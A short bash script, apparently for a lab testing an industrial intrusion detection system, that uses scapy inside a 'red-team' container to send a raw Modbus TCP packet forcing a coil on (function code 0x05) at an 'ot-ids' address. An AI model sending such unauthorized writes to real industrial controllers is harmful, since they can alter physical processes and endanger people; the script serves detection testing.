#!/bin/bash
echo "=== Sending Modbus Unauthorized Write (FC 0x05) from red-team to ot-ids ==="
docker exec red-team python3 -c "from scapy.all import *; send(IP(dst='192.168.151.30')/TCP(dport=502)/Raw(b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\xff\x00'), verbose=False)"
echo "Attack sent!"
